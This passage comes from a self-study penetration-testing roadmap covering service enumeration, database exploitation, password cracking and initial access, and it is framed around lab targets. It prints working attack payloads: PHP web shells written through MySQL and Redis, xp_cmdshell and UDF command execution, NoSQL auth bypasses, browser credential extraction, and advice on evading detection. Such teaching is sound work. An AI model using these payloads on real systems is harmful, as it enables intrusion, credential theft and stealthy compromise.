> ⏱️ **Time Bracket: 1 day** — Database discovery on standard/non-standard ports (MySQL 3306, MSSQL 1433, PostgreSQL 5432, Oracle 1521, MongoDB 27017, Redis 6379, Elasticsearch 9200), default credential testing (root/(empty), sa/sa, postgres/postgres — document which engine each belongs to), INFORMATION_SCHEMA enumeration (databases, tables, columns, user grants), backup/recovery artefact hunting (`.sql` dumps, `.bak` files, recovery logs with embedded credentials), web application enumeration (Gobuster/feroxbuster/ffuf — discover `/api/v1/`, `/admin`, `/backup.zip`, `.git/` directories, `.env` files). Deliverable: enumerate a MySQL lab instance and produce a complete schema map with user accounts and their permissions.

- [ ] **Database Discovery:** Identify **MySQL, MSSQL, PostgreSQL, Oracle, MongoDB, Redis, Elasticsearch** on standard/non-standard ports.

- [ ] **Database Default Creds:** Test **default credentials** (root/password, sa/sa, admin/admin) against discovered databases.

- [ ] **Database Information Schema:** Query **INFORMATION_SCHEMA** tables to enumerate **user accounts, object permissions, stored procedures**.

- [ ] **Backup & Recovery:** Identify **backup locations, recovery mode**, and **log files** that may contain **plaintext passwords or recovery keys**.

- [ ] **Web Application Enumeration:** Use **Gobuster, feroxbuster, ffuf** to discover **hidden directories, API endpoints, admin panels, configuration files, and backup archives** (.bak, .old, .swp).

---

### Topic 5: Attack Surface Consolidation & Enumeration OpSec — 🧠🔬 Mixed
[[Topic-5_NTP-and-RPC-Enumeration|📁]]

> [!TIP]
> **Goal:** Consolidate findings into an attack plan while maintaining stealth.

> [!NOTE]
> ⏱️ **Time Bracket: 1 day** — Build a structured target profile (users from LDAP/SMB, credentials from SNMP defaults, shares from null session, services from Nmap, misconfigs from banner analysis, web dirs from ffuf), prioritize attack paths (null sessions > default creds > writable shares > exposed admin panels > AS-REP Roastable accounts > unpatched services), tool fingerprinting awareness (every tool leaves IOCs — rotate User-Agents, throttle query rates, vary source ports, avoid rapid-fire LDAP/SMB bursts), timestamp all findings (feeds directly into reporting). Deliverable: produce a final attack surface map from all Module 10 labs with ranked exploitation paths and estimated detection risk for each.

- [ ] **Attack Surface Map:** Combine all enumeration results into a **structured target profile** — users, credentials, shares, services, misconfigurations, and potential exploitation vectors.

- [ ] **Prioritized Attack Paths:** Rank targets by **exploitability and impact** — prioritize **null sessions, default credentials, writable shares, exposed admin panels, and AS-REP Roastable accounts**.

- [ ] **Tool Fingerprinting Awareness:** Understand that enumeration tools leave signatures — **vary User-Agents, throttle requests, rotate source IPs** where possible.

- [ ] **Timing Discipline:** Spread enumeration queries over time; avoid **rapid-fire LDAP/SMB/SNMP queries** that trigger **anomaly-based detection**.

- [ ] **Documentation:** Record all findings with **timestamps, source IPs, and tool commands** used — this feeds directly into **reporting and evidence collection**.

### Lab Progression (Module 10: Enumeration)

| Level | Task | Deliverable |
| ----- | ------------------------------------------------------------ | ---------------------------------------------- |
| 1 | Enumerate SMB shares and users on a Windows lab target | Enumeration findings document |
| 2 | Enumerate SNMP on a network device (community strings, MIBs) | SNMP data export |
| 3 | Perform full LDAP enumeration against a lab AD domain | User/group/OU listing |
| 4 | Enumerate DNS zone transfers and subdomain brute-forcing | DNS enumeration report |
| 5 | Build a complete attack surface map from enumeration data | Attack profile document with prioritized paths |

> [!IMPORTANT]
> **Move-On Gate:** I can enumerate services, users, shares, and misconfigurations across SMB, LDAP, SNMP, DNS, and web services, and produce a prioritized attack surface map.

---

---

## Module 11: Database Security
[[Module-11_Database-Security|📁]]

> [!NOTE]
> **📚 Recommended Books for This Module**
> - 🔴 `Web Application Hacking Advanced SQL Injection and Data Store Attacks` — DB internals chapters only now; save injection chapters for Stage 3
> - 🟡 `Database Security Problems and Solutions` — Full (reference) — attacker-focused DB misconfiguration and exploitation techniques

> [!NOTE]
> **Navigational Note — Scope:** Module 11 focuses on direct database engine exploitation, authentication bypass, and privilege escalation (UDF, xp_cmdshell, misconfigurations). Application-layer SQL Injection is taught in [[Cyber-Security/Roadmap/Stage-3_Web-and-App-Sec#Module 14: Web Application Hacking|Stage 3: Module 14]].

> [!IMPORTANT]
> **Prerequisites:** Module 10 (Enumeration) — specifically Topic 4 (Database & Application Enumeration). I should already be able to identify running database services and version-fingerprint them before starting this module.

> [!TIP]
> ⏱️ **Module 11 Total Time Budget: 1.5–2 weeks**
> Topic 1 (enumeration/fingerprinting): 2–3 days | Topic 2 (relational DB exploitation): 3–4 days | Topic 3 (NoSQL/modern): 2–3 days | Topic 4 (privilege escalation): 1–2 days | Topic 5 (defence): 1–2 days | Labs: 3–4 days.
> This module has serious exploitable techniques. You will run `xp_cmdshell` and get an OS shell from a database service. Do not rush past that — it’s a critical skill for OSCP and real engagements where DBAs forget to disable SA accounts.

### Topic 1: Database Enumeration & Fingerprinting — 🔬 Practical
[[Topic-1_Database-Enumeration-and-Fingerprinting|📁]]

> [!TIP]
> **Goal:** Identify database engine, version, authentication mechanism, and attack surface before attempting exploitation.

> [!NOTE]
> ⏱️ **Time Bracket: 2 days** — Day 1: Service discovery (nmap for DB ports: 3306/1433/5432/1521/27017/6379/9200, version banners for each engine), default credential testing (root/(empty), sa/sa, postgres/postgres, MongoDB unauthenticated — document them all), schema enumeration via INFORMATION_SCHEMA. Day 2: SQLite discovery on compromised hosts (`find / -name "*.db" -o -name "*.sqlite"`), browser credential extraction from Chrome/Firefox SQLite databases (Login Data, Cookies), Redis unauthenticated access and CONFIG REWRITE commands. Deliverable: fingerprint and default-credential test 3 different database engines in your lab and document what each leaks without authentication.

- [ ] **Service Discovery:** Scan for database services on standard and non-standard ports:
  - MySQL / MariaDB: 3306 | MSSQL: 1433 (TCP), 1434 (UDP browser) | PostgreSQL: 5432
  - Oracle: 1521 (TNS) | MongoDB: 27017 | Redis: 6379 | Elasticsearch: 9200 (HTTP), 9300 (cluster)
  - **SQLite: no network port** — SQLite is an embedded, serverless database stored as a single file on disk (`.db`, `.sqlite`, `.sqlite3`). It is not a network service. Discovery is via filesystem enumeration: `find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null`. Common locations: Android app data (`/data/data/<package>/databases/`), iOS app sandbox, browser profile directories (Chrome/Firefox history, cookies, logins stored in SQLite), desktop applications, and web apps that use SQLite as a lightweight backend.
  - Use: `nmap -sV -p 1433,3306,5432,1521,27017,6379,9200 <target>`

- [ ] **SQLite Enumeration & Exploitation:** Once a SQLite file is found on a compromised host:
  ```bash
  # Open and enumerate
  sqlite3 target.db
  .tables                          # list all tables
  .schema <tablename>              # show table structure
  SELECT * FROM <tablename>;       # dump contents

  # One-liner dump without interactive shell
  sqlite3 target.db ".dump"
  sqlite3 target.db "SELECT * FROM users;"

  # Extract browser credentials (Chrome — Linux path)
  sqlite3 ~/.config/google-chrome/Default/Login\ Data \
    "SELECT origin_url, username_value, password_value FROM logins;"
  # Note: password_value is DPAPI-encrypted on Windows; AES-256 key stored in 'Local State'
  # Use tools: SharpChrome, HackBrowserData, LaZagne
  ```
  **High-value SQLite targets on a compromised system:**
  - **Browser credentials:** Chrome/Edge `Login Data`, `Cookies`, `History` — all SQLite
  - **Firefox:** `logins.json` + `key4.db` (NSS key storage) — credentials encrypted with master password
  - **Android apps:** Every app's private database in `/data/data/<package>/databases/` — accessible after rooting or via ADB backup
  - **iOS apps:** App sandbox SQLite databases — accessible post-jailbreak or via iTunes backup extraction
  - **Slack, Signal (Desktop):** Store message history and sometimes tokens in SQLite
  - **Password managers (some):** Local vault files in SQLite format
  **Forensic note:** SQLite files contain a **freelist** of deleted pages — data is not zeroed on deletion. Forensic tools (`sqliteaos`, `undark`, `forensic-sqlite-recovery`) can recover deleted rows from the freelist and WAL (Write-Ahead Log) file.

- [ ] **Version Fingerprinting & Banner Grabbing:**
  - MySQL: `nmap --script mysql-info -p 3306 <target>` or `mysql -h <target> -u root`
  - MSSQL: `nmap --script ms-sql-info -p 1433 <target>` or `sqlcmd -S <target> -Q "SELECT @@VERSION"`
  - PostgreSQL: `psql -h <target> -U postgres`
  - Redis: `redis-cli -h <target> PING` then `INFO server`
  - Elasticsearch: `curl http://<target>:9200/`

- [ ] **Default Credentials Testing:**
  - MySQL: `root`/(empty), `root`/`root`, `root`/`password`
  - MSSQL: `sa`/(empty), `sa`/`sa`
  - PostgreSQL: `postgres`/`postgres`, `postgres`/(empty)
  - Oracle: `sys`/`change_on_install`, `system`/`manager`, `scott`/`tiger`
  - MongoDB/Redis (older): no authentication by default — direct connection succeeds
  - Use `nmap --script=<db>-brute` for automated default credential testing

- [ ] **Schema Enumeration (Authenticated):**
  - MySQL: `SELECT * FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys');`
  - MSSQL: `SELECT name FROM master.dbo.sysdatabases;` then `USE <db>; SELECT * FROM information_schema.tables;`
  - PostgreSQL: `\l`, `\c <db>`, `\dt`
  - Oracle: `SELECT owner, table_name FROM all_tables WHERE owner NOT IN ('SYS','SYSTEM');`

---

### Topic 2: Relational Database Exploitation — 🔬 Practical
[[Topic-2_Relational-Database-Exploitation|📁]]

> [!TIP]
> **Goal:** Escalate from database access to OS command execution and credential extraction.

> [!NOTE]
> ⏱️ **Time Bracket: 3 days** — Day 1: MySQL exploitation (FILE privilege — read `/etc/passwd`, write PHP web shell to `/var/www/html`; UDF injection — upload shared library, create function, execute OS commands; MySQL hash extraction and hashcat cracking). Day 2: MSSQL exploitation (xp_cmdshell enable sequence, execute `whoami`/reverse shell; linked server query pivoting; CLR assembly loading; EXECUTE AS impersonation; MSSQL hash extraction). Day 3: PostgreSQL (COPY TO PROGRAM for OS command exec, pg_read_file, lo_export file write), Oracle (UTL_FILE, Java stored procedures, DB Links). Deliverable: achieve OS command execution from MySQL via UDF and from MSSQL via xp_cmdshell in your lab. Document every SQL command in sequence.

**MySQL / MariaDB:**

- [ ] **FILE Privilege Exploitation:** With `FILE` privilege, read OS files: `SELECT LOAD_FILE('/etc/passwd');` and write files: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';` (requires `secure_file_priv` to be empty or set to a writable path).

- [ ] **User Defined Functions (UDFs):** Upload a malicious shared library to the plugin directory, create a UDF from it, and execute OS commands:

  ```sql
  SELECT LOAD_FILE('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
  CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
  SELECT sys_exec('id > /tmp/pwned.txt');
  ```

- [ ] **MySQL Hash Extraction:** `SELECT user, authentication_string FROM mysql.user;` — MySQL 8+ uses `caching_sha2_password`. Crack with `hashcat -m 7401`.

**MSSQL:**

- [ ] **`xp_cmdshell` OS Command Execution:**

  ```sql
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
  EXEC xp_cmdshell 'powershell -EncodedCommand <base64_payload>';
  ```

- [ ] **Linked Server Pivoting:** Query remote databases via linked server definitions — execute commands on linked servers with `EXEC ('EXEC xp_cmdshell ''whoami''') AT [linked_server_name];`. Enumerate: `SELECT * FROM sys.servers WHERE is_linked = 1;`

- [ ] **CLR Assemblies:** Load a .NET assembly as a stored procedure to execute arbitrary .NET code (requires `clr enabled = 1` and sysadmin).

- [ ] **Impersonation (`EXECUTE AS`):** `EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami'; REVERT;` — works if the current login has `IMPERSONATE` permission on the target login.

- [ ] **MSSQL Hash Extraction:** `SELECT name, password_hash FROM sys.sql_logins;` (requires sysadmin). Crack with `hashcat -m 1731`.

**PostgreSQL:**

- [ ] **`COPY TO PROGRAM` — OS Command Execution:** `COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';` (superuser only)

- [ ] **`pg_read_file` — File Read:** `SELECT pg_read_file('/etc/passwd', 0, 100000);`

- [ ] **`lo_export` — File Write via Large Objects:** Write arbitrary content to arbitrary paths using `lo_from_bytea` + `lo_export`.

**Oracle:**

- [ ] **UTL_FILE / Java Stored Procedures:** File read/write via UTL_FILE directory objects. OS command execution via Java stored procedures if Java is enabled and permissions granted.

- [ ] **DB Links:** Enumerate with `SELECT * FROM dba_db_links;` — execute queries across links: `SELECT * FROM table@remote_db_link;`

---

### Topic 3: NoSQL & Modern Database Attacks — 🔬 Practical
[[Topic-3_NoSQL-and-Modern-Database-Attacks|📁]]

> [!TIP]
> **Goal:** Attack non-relational databases — different injection syntax, different attack surfaces, different default security postures.

> [!NOTE]
> ⏱️ **Time Bracket: 2 days** — Day 1: MongoDB unauthenticated access (default bind-all, `mongosh` direct connect, `show dbs`/`db.system.users.find()`), NoSQL injection (`{"$gt": ""}` auth bypass, `{"$regex": "admin"}` data enumeration, `$ne` operator abuse), Redis unauthenticated access (CONFIG REWRITE for web shell, SSH key injection, module loading RCE). Day 2: Elasticsearch unauthenticated data access (curl `/_cat/indices`, `/_search` dump), Elasticsearch CVE awareness (CVE-2014-3120, CVE-2015-1427 Groovy sandbox escapes). Deliverable: perform a MongoDB `$ne` authentication bypass and a Redis web shell injection in your lab. Document both payloads.

**MongoDB:**

- [ ] **Unauthenticated Access:** MongoDB < 2.6 and many misconfigured deployments run without authentication. Test: `mongosh <target>:27017`. Enumerate: `show dbs; use admin; db.system.users.find();`

- [ ] **NoSQL Injection (via Web App):** When user input reaches MongoDB queries without sanitisation:
  - Login bypass: `{"username": {"$gt": ""}, "password": {"$gt": ""}}` — matches any non-empty username/password
  - Data extraction: `{"username": {"$regex": "admin"}, "password": {"$gt": ""}}` — regex enumeration

- [ ] **`$ne` Authentication Bypass:** `db.users.find({"username": "admin", "password": {"$ne": "wrong"}})` — finds admin where password is NOT "wrong" (always matches if admin exists).

**Redis:**

- [ ] **Unauthenticated Access:** Redis defaults to no auth on localhost. When exposed externally: `redis-cli -h <target> INFO server`

- [ ] **Config Rewrite RCE (Web Shell):**

  ```bash
  redis-cli -h <target> CONFIG [[SET]] dir /var/www/html
  redis-cli -h <target> CONFIG SET dbfilename shell.php
  redis-cli -h <target> SET payload '<?php system($_GET["cmd"]); ?>'
  redis-cli -h <target> SAVE
  ```

- [ ] **SSH Key Injection:** If Redis runs as a user with an SSH directory, inject my public key into `authorized_keys` via `CONFIG SET dir` + `CONFIG SET dbfilename authorized_keys` + `SET sshkey "$(cat ~/.ssh/id_rsa.pub)"` + `SAVE`.

- [ ] **Module Loading RCE:** Redis 4.0+ supports `MODULE LOAD /path/to/malicious.so` for arbitrary code execution.

**Elasticsearch:**

- [ ] **Unauthenticated Data Access (< 8.0):** `curl http://<target>:9200/_cat/indices?v` to list indices. `curl http://<target>:9200/<index>/_search?pretty` to dump data.

---

### Topic 4: Database Privilege Escalation — 🔬 Practical
[[Topic-4_Database-Privilege-Escalation|📁]]

> [!TIP]
> **Goal:** Move from low-privileged DB access to OS command execution and system-level access.

> [!NOTE]
> ⏱️ **Time Bracket: 1 day** — MySQL vertical escalation (low-priv → FILE privilege via admin misconfiguration, write web shell), MSSQL TRUSTWORTHY database escalation (db_owner in TRUSTWORTHY DB owned by sysadmin → CREATE PROCEDURE → sysadmin), token impersonation via MSSQL service account (xp_cmdshell `whoami /priv` → SeImpersonatePrivilege present → GodPotato/PrintSpoofer → SYSTEM), cross-database linked server execution. Deliverable: escalate from a low-privilege MySQL account to file read of `/etc/shadow` using only SQL commands.

- [ ] **Vertical Escalation Within DB Engine:**
  - MySQL: Low-priv user → compromise MySQL root → grant `FILE` privilege → read `/etc/shadow` or write web shell
  - MSSQL: `db_datareader` → find TRUSTWORTHY database owned by sysadmin → escalate via `CREATE PROCEDURE` in TRUSTWORTHY context
  - Check MSSQL: `SELECT name, is_trustworthy_on FROM sys.databases;`

- [ ] **Token Impersonation via DB Service Account (Windows):** MSSQL often runs with `SeImpersonatePrivilege`. After `xp_cmdshell` RCE: `xp_cmdshell 'whoami /priv'`. If SeImpersonatePrivilege present, escalate to SYSTEM with PrintSpoofer or GodPotato.

- [ ] **Cross-Database Escalation (MSSQL):** A `db_owner` in a TRUSTWORTHY database can escalate to `sysadmin`: `EXECUTE AS USER = 'dbo'; EXEC master..xp_cmdshell 'whoami';`

---

### Topic 5: Database Auditing & Defence — 🧠🔬 Mixed
[[Topic-5_Database-Auditing-and-Defence|📁]]

> [!TIP]
> **Goal:** Understand the defender-side mitigations that block the attacks above.

> [!NOTE]
> ⏱️ **Time Bracket: 1 day** — Least privilege service accounts (application DB users should never have FILE, xp_cmdshell, SUPER — verify each attack and document which default config enables it), network isolation (DB ports should only be reachable from app server subnets — check nmap scan: if 3306/1433 is open to your scanner IP, it’s already misconfigured), authentication hardening (disable MySQL `test` DB and anonymous accounts, enforce MSSQL Windows Auth over SQL Auth, Redis `requirepass` + `bind 127.0.0.1`), audit logging (MSSQL Extended Events for xp_cmdshell/EXECUTE AS; MySQL general_log; PostgreSQL pgaudit). Deliverable: remediate every attack vector you exploited in Topics 1–4 in your lab and verify each fix blocks the technique.

- [ ] **Least Privilege Service Accounts:** Application DB users should only have SELECT/INSERT/UPDATE on specific tables — never `FILE`, `xp_cmdshell`, `SUPER`. `xp_cmdshell` should be disabled by default (check: `SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';`). MySQL `secure_file_priv` should not be empty.

- [ ] **Network Isolation:** DB ports (3306, 1433, 5432, 27017, 6379) should not be reachable from the internet or workstation subnets — only from dedicated application server subnets.

- [ ] **Authentication Hardening:**
  - MySQL: Disable `test` database, remove anonymous accounts, enforce password complexity
  - MSSQL: Prefer Windows Authentication over SQL Authentication
  - Redis: Set `requirepass <strong_password>` and bind to `127.0.0.1` only
  - MongoDB: Enable `auth = true` in `mongod.conf` with role-based users

- [ ] **Audit Logging:**
  - MSSQL: SQL Server Audit, Extended Events — log `xp_cmdshell`, `EXECUTE AS`, linked server queries, `CREATE PROCEDURE`
  - MySQL: `general_log = ON`; `audit_log` plugin for compliance
  - PostgreSQL: `log_statement = 'all'` or `pgaudit` extension

### Lab Progression (Module 11: Database Security)

| Level | Task | Deliverable |
| ----- | ---------------------------------------------------------------------------- | ------------------------------------------------------------- |
| 1 | Local MySQL lab: create a low-priv user, escalate via `FILE` privilege abuse | Step-by-step attack documentation |
| 2 | MSSQL in a lab VM: enable `xp_cmdshell`, execute OS commands, extract hashes | Command log + hash extraction proof |
| 3 | Redis without auth: RCE via config rewrite (web shell method) | Working web shell demonstration |
| 4 | MongoDB without auth: enumerate collections, test `$ne` auth bypass | Injection payload documentation |
| 5 | Full DB attack chain on HackTheBox/VulnHub machine with exposed DB service | Pentest-style report: enumeration → exploitation → escalation |

> [!IMPORTANT]
> **Move-On Gate:** I can enumerate database services, identify engine and version, test default credentials, achieve OS command execution on at least one DB engine (MySQL or MSSQL), and explain the defensive controls that would prevent each attack. Document every command and finding.

---

---

## Module 12: Password Cracking & Hash Analysis
[[Module-12_Password-Cracking|📁]]

> [!NOTE]
> **📚 Recommended Books for This Module**
> - 🔴 `Hacking_ The Art Of Exploitation 2nd Edition` — Cryptography and hashing chapter — ground-truth explanation of how hashes work and why cracking is possible
> - 🟡 `Reverse Engineering and Password Breaking` — Full (short) — direct coverage of hash formats and cracking methodology
> - 🟢 `Computer & Internet Security A Hands on Approach 2nd Ed` — Authentication chapters — explains salting, key derivation, and why bcrypt/Argon2 resist cracking

> [!NOTE]
> **Navigational Note — Placement:** Module 12 (Password Cracking & Hash Analysis) sits directly between Module 10 (Enumeration) and Module 13 (System Hacking) because password cracking is a **direct prerequisite for System Hacking**: I cannot effectively use Pass-the-Hash, hash cracking, or credential reuse without first mastering hash identification and offline cracking mechanics. Proceed to Module 13 after completing this.

> [!TIP]
> ⏱️ **Module 12 Total Time Budget: 1 week**
> Topic 1 (identification/acquisition): 1–2 days | Topic 2 (methodology/tools): 2 days | Topic 3 (protocol-specific): 1–2 days | Topic 4 (wordlist curation): 1 day | Labs: 2 days.
> Hashcat is a GPU tool. If your machine doesn’t have a discrete GPU, use cloud GPU (vast.ai is cheap, or use Google Colab for small jobs). Don’t waste a week trying to crack bcrypt on a CPU. Time your attacks intelligently.

### Topic 1: Hash Identification & Acquisition — 🔬 Practical
[[Topic-1_Hash-Identification-and-Acquisition|📁]]

> [!TIP]
> **Goal:** Identify what I have before cracking.

> [!NOTE]
> ⏱️ **Time Bracket: 1–2 days** — Day 1: Hash identification tools (hashid, hash-identifier, Name-That-Hash — learn to identify visually by format: `$2y$` = bcrypt, `$6$` = SHA-512 crypt, 32 hex chars = MD5/NTLM, `$krb5tgs$23$` = Kerberoast TGS-REP), hash acquisition methods (SAM/NTDS.dit — Windows local/domain hashes; /etc/shadow — Linux hashes; database dumps; LSASS memory dump; captured NTLMv2 from Responder; PCAP files). Day 2: Common hash type mastery: NTLM (`-m 1000`), NetNTLMv2 (`-m 5600`), Kerberos TGS-REP (`-m 13100`), AS-REP (`-m 18200`), bcrypt (`-m 3200`), SHA-512 crypt (`-m 1800`), WPA2 (`-m 22000`). Deliverable: identify 10 hashes from a mixed sample file using only visual inspection, then verify with hashid.

- [ ] **Hash Identification:** Use **hashid, hash-identifier, Name-That-Hash** to identify algorithm from hash format (length, prefix like `$2y$`, `$6$`, `$NT$`).

- [ ] **Hash Acquisition:** Obtain hashes from **SAM/NTDS.dit (Windows), /etc/shadow (Linux), database dumps, LSASS memory, pcap files, web app source**.

- [ ] **Common Hash Types:** Master identifying and handling **NTLM, NTLMv1/v2, NetNTLM, MD5, SHA-1, SHA-256, bcrypt, Argon2, PBKDF2, WPA2-PMKID, Kerberos (5/17/18/23)**.

---

### Topic 2: Cracking Methodology & Tools — 🔬 Practical
[[Topic-2_Cracking-Methodology-and-Tools|📁]]

> [!TIP]
> **Goal:** Apply the right technique to each hash type.

> [!NOTE]
> ⏱️ **Time Bracket: 2 days** — Day 1: Hashcat attack modes: `-a 0` (dictionary — rockyou.txt as baseline), `-a 1` (combination — two wordlists), `-a 3` (brute/mask — `?u?l?l?l?d?d?s` pattern), `-a 6/-a 7` (hybrid wordlist+mask), session management (`--session`/`--restore`), potfile (`--show`). Day 2: John the Ripper: format auto-detection, incremental mode, custom rules for non-GPU-friendly hashes (bcrypt, Argon2). Rule-based attacks: best64.rule, OneRuleToRuleThemAll, d3ad0ne — understand what each mangling operation does (append digit, capitalize, leet-speak). Mask attacks for corporate password patterns (`Summer2024!`, `Company123!`). Deliverable: crack a set of 20 NTLM hashes using dictionary-only, then rules, then masks in sequence — document crack rate at each stage.

- [ ] **[[Hashcat]] Fundamentals:** Master **attack modes (-a 0 dictionary, -a 1 combination, -a 3 brute/mask, -a 6/7 hybrid)**, GPU acceleration, session management, and potfile usage.

- [ ] **[[John_the_Ripper]]:** Use **JtR** for format auto-detection, **incremental mode, wordlist mode, rules**, and cracking **non-GPU-friendly formats** (bcrypt, Argon2).

- [ ] **Dictionary Attacks:** Use curated wordlists — **rockyou.txt, SecLists, weakpass, kaonashi** — as the first pass against any hash.

- [ ] **Rule-Based Attacks:** Apply **Hashcat rules (best64.rule, OneRuleToRuleThemAll, d3ad0ne)** to mangle wordlists — capitalize, add numbers, leet-speak substitutions — to crack complex passwords efficiently.

- [ ] **Mask Attacks:** Use **Hashcat mask syntax** (`?u?l?l?l?l?d?d?s`) to brute-force **known password patterns** (e.g., company naming conventions, seasonal passwords like `Summer2024!`).

- [ ] **Hybrid Attacks:** Combine **wordlist + mask** (`-a 6` / `-a 7`) to crack passwords like `rockyou_words + 2024!` or `!2024 + rockyou_words`.

- [ ] **Rainbow Tables:** Understand **precomputed hash-to-plaintext lookup tables** and why **salting defeats them**; use **RainbowCrack** for legacy unsalted MD5/SHA1.

---

### Topic 3: Protocol-Specific Cracking — 🔬 Practical
[[Topic-3_Protocol-Specific-Cracking|📁]]

> [!TIP]
> **Goal:** Crack hashes captured from real network protocols.

> [!NOTE]
> ⏱️ **Time Bracket: 1–2 days** — Day 1: NetNTLMv2 (capture with Responder: `sudo responder -I eth0 -wPF`, crack with `hashcat -m 5600 <hash> rockyou.txt -r best64.rule`), Kerberoasting TGS-REP (`-m 13100` — use targeted wordlist for service accounts — naming conventions matter), AS-REP Roasting (`-m 18200` — accounts without pre-auth, enumerated with kerbrute). Day 2: WPA2 PMKID (`-m 22001` — capture with hcxdumptool, convert with hcxpcapngtool), SSH passphrase cracking (ssh2john, JtR), Office/PDF/ZIP password extraction (office2john, pdf2john, zip2john — know which tool produces which format for hashcat/JtR). Deliverable: set up Responder in your lab, force an NTLM authentication, capture the NTLMv2 hash, and crack it with hashcat + rockyou + best64 rule.

- [ ] **NTLM / NetNTLMv2:** Capture with **[[Responder]], ntlmrelayx**; crack with **hashcat -m 5600**; understand why NTLMv2 is harder than NTLMv1.

- [ ] **Kerberos Tickets:** Crack **Kerberoasted TGS (-m 13100)** and **AS-REP hashes (-m 18200)** offline with hashcat using targeted service-account wordlists.

- [ ] **WPA2 Handshakes:** Crack **4-way handshake (-m 22000)** and **PMKID (-m 22001)** from wireless captures with GPU-accelerated hashcat.

- [ ] **SSH Private Keys:** Use **ssh2john** to extract crackable hash from passphrase-protected keys; crack with JtR.

- [ ] **Office / PDF / ZIP:** Extract hashes with **office2john, pdf2john, zip2john**; crack with JtR or hashcat for document password recovery.

---

### Topic 4: Wordlist & Intelligence Curation — 🔬 Practical
[[Topic-4_Wordlist-and-Intelligence-Curation|📁]]

> [!TIP]
> **Goal:** Build targeted wordlists that outperform generic lists.

> [!NOTE]
> ⏱️ **Time Bracket: 1 day** — CeWL spider (target website vocabulary extraction for highly targeted company-specific wordlist), custom rule writing (encode the target’s known password policy: minimum 8 chars, requires uppercase + number + special — write a hashcat rule that enforces this pattern), breach corpus integration (Collection #1, Dehashed — extract target-domain-specific passwords from previous breaches for credentialed user accounts), PACK/Mentalist analysis (analyze already-cracked passwords to identify statistical patterns: prefix/suffix clusters, seasonal patterns, length distribution). Deliverable: generate a custom CeWL wordlist for a target website, combine with best64 rules, and demonstrate a higher crack rate than rockyou.txt alone on a set of bcrypt hashes.

- [ ] **OSINT-Driven Wordlists:** Use **CeWL** to spider target websites and extract **company-specific vocabulary** for highly targeted password lists.

- [ ] **Custom Rule Writing:** Write **Hashcat/JtR rules** encoding target's known password policy — minimum length, required chars, common suffix patterns.

- [ ] **Credential Stuffing Lists:** Use **breach corpora (Collection #1, Dehashed)** to build target-specific lists from previously leaked passwords for the same user base.

- [ ] **Mentalist / PACK:** Use **Mentalist (GUI) or PACK (Policy Analysis)** to analyze cracked passwords and generate statistically optimized masks and rules.

> 📌 **Cross-Reference:** Password cracking skills are directly applied in **[[Cyber-Security/Roadmap/Stage-4_Enterprise#Module 19: Active Directory & Entra ID|Stage 4: Module 19 (Active Directory & Entra ID)]]** (Kerberoasting, AS-REP Roasting), **[[Cyber-Security/Roadmap/Shelf_Post-Hire#Shelf 01: Wireless Network Security|Shelf 01: Wireless Network Security]]** (WPA handshake cracking), and **Module 13: System Hacking** (credential-based lateral movement). Complete this module before Stage 4.

---

---

## Module 13: System Hacking & Initial Compromise
[[Module-13_System-Hacking|📁]]

> [!NOTE]
> **📚 Recommended Books for This Module**
> - 🔴 `The Hacker Playbook 3 (Red Team Edition)` — Primary companion — initial access, privesc, persistence — read chapters in parallel with labs
> - 🔴 `Hacking_ The Art Of Exploitation 2nd Edition` — Shellcode, stack/heap overflows — the foundational exploitation textbook; understand WHY exploits work
> - 🔴 `Red Team Field Manual v3` — ⚡ Keep open always as command reference
> - 🟡 `The Hacker Playbook 2` — Exploitation and post-exploitation — practical walk-through of real techniques
> - 🟡 `Gray Hat Hacking The Ethical Hacker's Handbook 2022` — System exploitation, modern privesc techniques
> - 🟢 `Exploitation Techniques and Tools` — Technique catalog — use as lookup when encountering a specific technique in labs
> - 🟢 `Exploit Development on Linux Platform` — Full — Linux-specific exploitation fundamentals

> [!TIP]
> ⏱️ **Module 13 Total Time Budget: 4–5 weeks** — This is the heaviest lab module in Stage 2.
> Topic 1 (initial access): 1–1.5 weeks | Topic 2 (privilege escalation — Windows + Linux): 2 weeks | Topic 3 (persistence + lateral movement): 4–6 days | Topic 4 (defense evasion): 3–4 days | Topic 5 (exfiltration): 2–3 days | Topic 6 (governance/reporting): 2–3 days | Labs + HTB boxes: ongoing.
> You cannot rush privilege escalation. The 9-vector Windows methodology and the 9-vector Linux methodology here represent the OSCP exam and real-world coverage. Work every vector on a dedicated lab VM before calling this done. No walkthrough shortcuts.

### Topic 1: The Breach (Initial Access & Exploitation) — 🔬 Practical
[[Topic-1_Password-Attacks|📁]]

> [!TIP]
> **Goal:** Weaponize theoretical vulnerabilities to bypass the perimeter and establish foothold.

> [!NOTE]
> ⏱️ **Time Bracket: 1–1.5 weeks** — Days 1–3: Application/web exploitation (SQL injection payloads: error-based/blind/union/time-based; buffer overflow ROP chain basics; directory/path traversal; SSTI Jinja2/Twig; deserialization; SSRF to internal IMDS; XXE). Days 4–5: Credential assault (Hydra for online brute-force: `hydra -L users.txt -P rockyou.txt ssh://<target>`; password spray with low-and-slow lockout awareness; default credential testing; credential stuffing with breach data). Days 6–7: Social engineering awareness (phishing HTML-smuggled payloads, ISO/LNK loaders, OneNote macros), MITM/network interception (tcpdump, Wireshark on a gateway — full treatment in Module 23), and consolidate all 3 initial access lab compromises. Deliverable: gain initial access to a lab target using at least 3 different vectors (exposed service + weak creds + web app vuln). Document each with full command output.

**Application & Web Exploitation:**

- [ ] **SQL Injection:** Craft payloads for **error-based, blind, union-based, and time-based** exfiltration.

- [ ] **Buffer Overflow:** Target legacy binaries; craft **ROP chains** to bypass **ASLR/DEP**.

- [ ] **Directory/Path Traversal:** Abuse improper input validation to read **system files, configs, or keys**.

- [ ] **SSTI/Template Injection:** Exploit **Jinja2, Twig, ERB** misconfigs for **RCE**.

